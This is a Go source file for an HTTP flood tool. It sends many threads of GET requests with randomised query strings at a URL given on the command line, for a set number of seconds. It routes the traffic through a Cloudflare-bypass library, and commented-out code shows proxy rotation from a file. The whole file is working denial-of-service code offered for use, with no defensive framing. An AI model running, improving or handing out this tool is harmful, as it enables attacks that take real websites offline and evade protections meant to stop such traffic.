package main

import (
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"time"

	bypasser "github.com/AurevoirXavier/cloudflare-bypasser-go"
)

func randomString(l int) string {
	rand.Seed(time.Now().UnixNano())
	var pool = "abcdefghijklmnopqrstuvwxyzABCEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	bytes := make([]byte, l)
	for i := 0; i < l; i++ {
		bytes[i] = pool[rand.Intn(len(pool))]
	}
	return string(bytes)
}

func flood() {
	urls := os.Args[1] + "?" + randomString(int(rand.Intn(32)+1))
	var (
		//_      = os.Setenv("HTTP_PROXY", proxies)
		client = bypasser.NewBypasser(http.DefaultClient)
		req, _ = http.NewRequest("GET", urls, nil)
	)
	for i := 0; i < 100; i++ {
		client.Bypass(req, 100)
	}
}

func main() {
	if len(os.Args) != 4 {
		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <time>")
		os.Exit(1)
	}
	threads, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Threads should be a integer")
	}
	limit, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("limit should be a integer")
	}
//	var proxies []string
//	file, errr := os.Open("proxy.txt")
//	if errr != nil {
//		fmt.Printf("failed opening file: %s", err)
//	}
//	scanner := bufio.NewScanner(file)
//	scanner.Split(bufio.ScanLines)
//	for scanner.Scan() {
//		proxies = append(proxies, scanner.Text())
//	}
	for i := 0; i < threads; i++ {
		time.Sleep(time.Microsecond * 100)
		//proxies := "http://" + proxies[rand.Intn(len(proxies))]
		go flood() // Start threads
		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
		os.Stdout.Sync()
	}
	fmt.Printf("\n")
	fmt.Println("Flood will end in " + os.Args[3] + " seconds.")
	time.Sleep(time.Duration(limit) * time.Second)
}
